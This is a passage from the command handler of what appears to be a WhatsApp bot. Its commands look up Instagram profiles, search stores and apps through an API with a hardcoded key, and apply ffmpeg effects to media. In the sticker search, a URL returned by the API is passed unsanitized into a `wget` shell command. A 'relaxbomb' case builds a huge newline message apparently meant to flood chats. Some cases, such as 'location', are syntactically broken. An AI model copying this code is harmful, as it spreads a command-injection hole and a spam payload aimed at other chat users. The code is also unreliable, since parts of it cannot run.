teks = '𝗜𝗚 𝗦𝗧𝗢𝗥𝗬\n'
for (let i of anu.data) {
teks += `Username : ${anu.username}
Total story : ${anu.stories_count}
Tipe : ${i.type}
Story : ${i.url}
Swipe Up Link : ${i.swipeUpLink}\n\n𝗜𝗚 𝗦𝗧𝗢𝗥𝗬\n`
}
reply(teks.trim())
break

case 'mediafire': 
anu = await fetchJson(`https://api.zeks.xyz/api/mediafire?apikey=apivinz&url=${args[0]}`, {method: 'get'})
buffer = await getBuffer(anu.download)
teks = `Nama File : ${anu.name_file}
File Size : ${anu.file_size}
Tanggal Upload : ${anu.upload_date}
File Tipe : ${anu.file_type}
Link Download : ${anu.download}
Deskripsi : ${anu.description}`
tiringa.sendMessage(from, teks, text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
costum(buffer, MessageType.document)
break

case 'playstore': 
anu = await fetchJson(`https://api.zeks.xyz/api/sgplay?apikey=apivinz&q=${body.slice(11)}`, {method: 'get'})
buffer = await getBuffer(`https://i.ibb.co/znvZ20B/9b667c9d4b1b.jpg`)
tiringa.sendMessage(from, buffer, image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
teks = '𝗣𝗹𝗮𝘆 𝘀𝘁𝗼𝗿𝗲\n'
for (let i of anu.result) {
teks = `Nama Apk : ${i.title}
App ID : ${i.appid}
Developer : ${i.developer}
Price : ${i.price}
Rate : ${i.rating}
Url Apk : ${i.url}
𝗣𝗹𝗮𝘆 𝘀𝘁𝗼𝗿𝗲
`
}
reply(teks.trim())
break

case 'searchsticker': 
case 'searchstiker': 
ranp = getRandom('.png')
rano = getRandom('.webp')
anu = await fetchJson(`https://api.zeks.xyz/api/searchsticker?apikey=apivinz&q=${body.slice(14)}`, {method: 'get'})
buffer = await getBuffer(anu.thumb)
teks = `Name Sticker : ${anu.title}`
dung = (anu.sticker)
tiringa.sendMessage(from, buffer, image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek, caption: teks})
var tes2 =  dung[Math.floor(Math.random() * dung.length)];
exec(`wget ${tes2} -O ${ranp} && ffmpeg -i ${ranp} -vcodec adminwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
if (err) return reply('Error cok')
fs.unlinkSync(ranp)
buffer2 = fs.readFileSync(rano)
costum(buffer2, sticker, tescuk, `Judul Sticker : ${anu.title}`)
fs.unlinkSync(rano)
})
break

case 'igstalk': 
anu = await fetchJson(`https://api.zeks.xyz/api/igstalk?apikey=apivinz&username=${body.slice(9)}`, {method: 'get'})
buffer = await getBuffer(anu.profile_pic)
teks = `Username : ${anu.username}
Fullname : ${anu.fullname}
Follower : ${anu.follower}
Following : ${anu.following}
Verified : ${anu.is_verified}
Bussiness : ${anu.is_bussiness}
Private : ${anu.is_private}
Link : https://www.instagram.com/${anu.username}
Bio : ${anu.bio}`
tiringa.sendMessage(from, buffer, image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek, caption: teks})
break

case 'shopee': 
anu = await fetchJson(`https://api.zeks.xyz/api/shopee?apikey=apivinz&q=${body.slice(9)}`, {method: 'get'})
buffer = await getBuffer(`https://i.ibb.co/yFZgntN/f9ab826750ea.jpg`)
teks = '𝗦𝗛𝗢𝗣𝗘𝗘\n'
for (let i of anu.data) {
teks += `Nama barang : ${i.name}
HMrG : ${i.hMrG}
Terjual : ${i.terjual}
Lokasi : ${i.location}
Cover : ${i.cover}
Stock : ${i.stock}
Informasi : ${i.information}
Url : ${i.url}
Deskripsi : ${i.desc}\n\n𝗦𝗛𝗢𝗣𝗘𝗘
`
}
tiringa.sendMessage(from, buffer, image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek, caption: teks.trim()})
break

case 'ytsearch': 
anu = await fetchJson(`https://api.zeks.xyz/api/yts?q=${body.slice(10)}&apikey=apivinz`, {method: 'get'})
buffer = await getBuffer(`https://i.ibb.co/XyS1DLw/cdfbdf66f07b.jpg`)
teks = '𝗬𝗼𝘂𝘁𝘂𝗯𝗲 𝗦𝗲𝗮𝗿𝗰𝗵\n'
for (let i of anu.result) {
teks += `Uploader : 
Nama Channel : ${i.uploader.username}
Url Channel : ${i.uploader.url}
Verified : ${i.uploader.verified}
Video :
Nama Video : ${i.video.title}
Url : ${i.video.url}
Durasi : ${i.video.duration}
Deskripsi : ${i.video.snippet}
Tanggal Upload : ${i.video.upload_date}
Views : ${i.video.views}\n\n𝗬𝗼𝘂𝘁𝘂𝗯𝗲 𝘀𝗲𝗮𝗿𝗰𝗵
`
}
tiringa.sendMessage(from, buffer, image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek, caption: teks.trim()})
break

case 'neonime': 
anu = await fetchJson(`https://api.zeks.xyz/api/neonimesearch?q=${body.slice(9)}&apikey=apivinz`, {method: 'get'})
teks = '𝗡𝗲𝗼𝗻𝗶𝗺𝗲 𝗦𝗲𝗮𝗿𝗰𝗵\n'
for (let i of anu.result) {
teks += `Nama Neonime : ${i.title}
Link : ${i.link}
Deskripsi : ${i.desc}\n\n𝗡𝗲𝗼𝗻𝗶𝗺𝗲 𝗦𝗲𝗮𝗿𝗰𝗵
`
}
reply(teks.trim())
break

case 'apkpure': 
reply(ptbr.wait())
anu = await fetchJson(`https://api.zeks.xyz/api/apkpure?q=${body.slice(9)}&apikey=apivinz`, {method: 'get'})
teks = '𝗔𝗽𝗸 𝗣𝘂𝗿𝗲 𝗦𝗲𝗮𝗿𝗰𝗵\n'
for (let i of anu.result) {
teks += `Nama Apk : ${i.title}
Url : ${i.url}
Rating : ${i.rating}\n\n𝗔𝗽𝗸 𝗣𝘂𝗿𝗲 𝗦𝗲𝗮𝗿𝗰𝗵
`
}
reply(teks.trim())
break

case 'igsearch': 
reply(ptbr.wait())
anu = await fetchJson(`https://api.zeks.xyz/api/iguser?apikey=apivinz&q=${body.slice(8)}`, {method: 'get'})
teks = '𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 𝗦𝗲𝗮𝗿𝗰𝗵\n'
for (let i of anu.result) {
teks += `Username : ${i.username}
Private : ${i.private_user}
Verified : ${i.verified_user}
Link : https://www.instagram.com/${i.username}\n\n𝗜𝗻𝘀𝘁a𝗴𝗿𝗮𝗺 𝗦𝗲𝗮𝗿𝗰𝗵
`
}
reply(teks.trim())
break

case 'happymod': 
reply(ptbr.wait())
anu = await fetchJson(`https://api.zeks.xyz/api/happymod?apikey=apivinz&q=${body.slice(10)}`, {method: 'get'})
teks = '𝗛𝗮𝗽𝗽𝘆 𝗺𝗼𝗱 𝗦𝗲𝗮𝗿𝗰𝗵\n'
for (let i of anu.result) {
teks += `Nama Apk : ${i.title}
Rating : ${i.rating}
Url : ${i.url}\n\n𝗛𝗮𝗽𝗽𝘆 𝗺𝗼𝗱 𝗦𝗲𝗮𝗿𝗰𝗵
`
}
reply(teks.trim())
break
					
case 'togif': // by lindow
if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
const encmediaaa = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const mediaaa = await tiringa.downloadAndSaveMediaMessage(encmediaaa)
reply(ptbr.wait())
a = await webp2gifFile(mediaaa)
mp4 = await getBuffer(a.result)
tiringa.sendMessage(from, mp4, MessageType.video, {mimetype: 'video/gif', filename: `stick.gif`, thumbnail: dnsnew, sendEphemeral: true,quoted: mek, caption: '✅'})
fs.unlinkSync(mediaaa)
}
break

case 'shutdown':
if (!isOwner) return reply(ptbr.ownerB())
reply('Shutting down in 3 seconds ....') 
setTimeout( () => {
tiringa.close() }, 3000)
break

//_NULIS
case 'nulis':
if (args.length < 1) return reply(`Use the command as follows: ${prefix}nulis (text)`)
teks = body.slice(7)
reply(ptbr.wait())
anu = await fetchJson(`https://tools.zone-xsec.com/api/nulis.php?q=${teks}`, {method: 'get'})
if (anu.error) return reply(anu.error)
buff = await getBuffer(anu.image)
tiringa.sendMessage(from, buff, image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek, caption: '✏📕'})
break

//_INFORMAÇÕES DO USUÁRIO
//await tiringa.getProfilePicture(`${sender.split('@')[0]}@c.us`)
case 'infome':
case 'profile':
msgFilter.isFiltered(from)
const usLevel = getLevelingLevel(sender)
const usXp = getLevelingXp(sender)
const usTime = getRegisterTime(sender) 
const serh = getRegisterSerial(sender)
const idad = getRegisterAge(sender)
const regin = getRegisterName(sender)
const requirXp = 500 * (Math.pow(2, usLevel) - 1)
try {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
const pf = 
`
  ‣ ɴᴀᴍe: @${sender.split("@")[0]}
  ‣ ʀᴇɢɪsᴛᴇʀᴇd: ✅
  ‣ ᴀɢe: ${idad}
  ‣ ʀᴇɢɪsᴛᴇʀᴀᴛɪᴏn ɴᴀᴍe: ${regin}
  ‣ ʀᴇɢɪsᴛᴇʀᴇd ᴅᴀᴛe: ${usTime}
  ‣ ʟᴇᴠᴇl: ${usLevel}
  ‣ xp: ${usXp}/${requirXp}
  ‣ ᴍᴇᴅᴇl: ${patt}
  ‣ ʟɪɴk: wa.me/${sender.split("@")[0]}
  ‣ ᴄᴏᴅe: ${serh}
`
its = await getBuffer (ppimg)
tiringa.sendMessage(from, its, image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek, caption: pf, contextInfo: {mentionedJid: [sender]}})
if(usLevel == undefined && usXp == undefined && usTime == undefined && serh == undefined) {
reply(`Information with "undefined" indicates that you have not yet registered \nUse the command ${prefix}register name|age`)
}
break

//_EFEITO REVERSE PARA VIDEO  
case 'reversevid':
if (!isQuotedVideo) return reply('Bookmark a video')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await tiringa.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(`Err: ${err}`)
buffer453 = fs.readFileSync(ran)
tiringa.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', thumbnail: dnsnew, sendEphemeral: true,quoted: mek })
fs.unlinkSync(ran)
})
break
		
//_EFEITO FAST PARA VIDEO  
case 'fastvid':
if (!isQuotedVideo) return reply('Bookmark a video')
reply(ptbr.wait())
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await tiringa.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(`Err: ${err}`)
buffer453 = fs.readFileSync(ran)
tiringa.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', thumbnail: dnsnew, sendEphemeral: true,quoted: mek })
fs.unlinkSync(ran)
})		
break
		
//_EFEITO SLOW PARA VIDEO  
case 'slowvid':
if (!isQuotedVideo) return fakegroup('Tag a video')
reply(ptbr.wait())
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await tiringa.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return fakegroup(`Err: ${err}`)
buffer453 = fs.readFileSync(ran)
tiringa.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', thumbnail: dnsnew, sendEphemeral: true,quoted: mek })
fs.unlinkSync(ran)
})
break

//_EFEITO NIGHTCORE PARA AUDIO         
case 'nightcore':
if (!isQuotedAudio) return reply('Book an audio')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await tiringa.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
tiringa.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
fs.unlinkSync(ran)
})
break   

//_EFEITO SLOW PARA AUDIO
case 'slow':
msgFilter.isFiltered(from)
if (!isQuotedAudio) return reply('Book an audio')
low = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
slo = await tiringa.downloadAndSaveMediaMessage(low)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${slo} -filter:a "atempo=0.9,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(slo)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
tiringa.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
fs.unlinkSync(ran)
})
break

//_EFEITO ESQUILO PARA AUDIO
case 'squirrel':
case 'tupai':
msgFilter.isFiltered(from)
if (!isQuotedAudio) return reply('Book an audio')
pai = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
tup = await tiringa.downloadAndSaveMediaMessage(pai)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${tup} -filter:a "atempo=0.7,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(tup)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
tiringa.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
fs.unlinkSync(ran)
})
break

//_EFDEITO GIGANTE PARA AUDIO	
case 'gemuk':
msgFilter.isFiltered(from)
if (!isQuotedAudio) return reply('Book an audio')
muk = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
gem = await tiringa.downloadAndSaveMediaMessage(muk)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
tiringa.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
fs.unlinkSync(ran)
})
break

//_DEIXA O AUDIO RÁPIDO
case 'fast':
if (!isQuotedAudio) return reply('Mark any audio')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await tiringa.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "atempo=0.9,asetrate=93100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Erro')
hah = fs.readFileSync(ran)
tiringa.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
fs.unlinkSync(ran)
})
break

//_AUMENTA O BASS DE UM AUDIO	
case 'bass':                 
msgFilter.isFiltered(from)
if (!isQuotedAudio) return reply('Book an audio')
ass = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
bas = await tiringa.downloadAndSaveMediaMessage(ass)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${bas} -af equalizer=f=20:width_type=o:width=2:g=15 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(bas)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
tiringa.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
fs.unlinkSync(ran)
})
break

//_DEIXA O AUDIO ESTOURADO		
case 'errape':         
case 'estourar': 
case 'miss':
msgFilter.isFiltered(from)
if (!isQuotedAudio) return reply('Book an audio')
ass = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
bas = await tiringa.downloadAndSaveMediaMessage(ass)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${bas} -af equalizer=f=90:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(bas)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
tiringa.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
fs.unlinkSync(ran)
})
break

//_INFORMAÇÕES DO BOT		
case 'info':
msgFilter.isFiltered(from)
me = tiringa.user
uptime = process.uptime()
inf =
 `‣ Nome do bot: ${me.name}
  ‣ Número do bot: @${me.jid.split('@')[0]}
  ‣ Dono: Italu
  ‣ Prefix: ${prefix}
  ‣ O bot está ativo há: ${temporizador(uptime)}
  ‣ Total de usuários: ${_registered.length} usuários
  ‣ Total chats: ${totalchat.length}`
buffer = await getBuffer(me.imgUrl)
tiringa.sendMessage(from, buffer, image, {caption: inf, contextInfo: {mentionedJid: [me]}})
break

//_INFORMAÇÕES DO GRUPO
case 'infogp':
case 'infogc':
case 'groupinfo':
case 'infogrup':
case 'grupinfo':
msgFilter.isFiltered(from)
tiringa.updatePresence(from, Presence.composing)
if (!isGroup) return reply(ptbr.group())
let { owner, creation, participants, desc } = groupMetadata;
const creationTime = moment.unix(creation);
try {
ppUrl = await tiringa.getProfilePicture(from)
} catch {
ppUrl = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
buffer = await getBuffer(ppUrl)
infogp = 
` 
  ‣Nome: ${groupName}
  ‣Quantidade de membros: ${groupMembers.length}
  ‣Total de administradores: ${groupAdmins.length}
  ‣Criador : @${owner.split('@')[0]}
  ‣Total de membros: ${participants.length} membros
  ‣Descrição:
  ${desc ? desc : ''}`
await tiringa.sendMessage(from, buffer, image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek, caption: infogp, contextInfo: {mentionedJid: [owner.split]}})
break
case 'location':
cdlocat = `safwan ganz`
tiringa.sendMessage(from, cdlocat, location, {quoted: message: { "location" : {
            "longitude" : 7.4954884,
            "latitude" : 51.5005765,
            "name" : "tyntec GmbH",
            "address" : "tyntec GmbH, Semerteichstraße, Dortmund",}}})
break
case 'relaxbomb':
relaxb =`[\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nrelax by slayer07\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nrealax by dragu\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nrealx by shaz\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n]`
{ quoted: relaxb }
break
case 'ping':
case 'speed':
msgFilter.isFiltered(from)
const pingi = sotoy[Math.floor(Math.random() * (sotoy.length))]	
ppg = Math.floor(Math.random() * 13) + 349
if ((pingi == '🥑 : 🥑 : 🥑') ||(pingi == '🍉 : 🍉 : 🍉') ||(pingi == '🍓 : 🍓 : 🍓') ||(pingi == '🍎 : 🍎 : 🍎') ||(pingi == '🍍 : 🍍 : 🍍') ||(pingi == '🥝 : 🥝 : 🥝') ||(pingi == '🍑 : 🍑 : 🍑') ||(pingi == '🥥 : 🥥 : 🥥') ||(pingi == '🍋 : 🍋 : 🍋') ||(pingi == '🍐 : 🍐 : 🍐') ||(pingi == '🍌 : 🍌 : 🍌') ||(pingi == '🍒 : 🍒 : 🍒') ||(pingi == '🔔 : 🔔 : 🔔') ||(pingi == '🍊 : 🍊 : 🍊') ||(pingi == '🍇 : 🍇 : 🍇')) {
}
const emox7 = ["✭","✮","✯","✰","⊛","✲"]
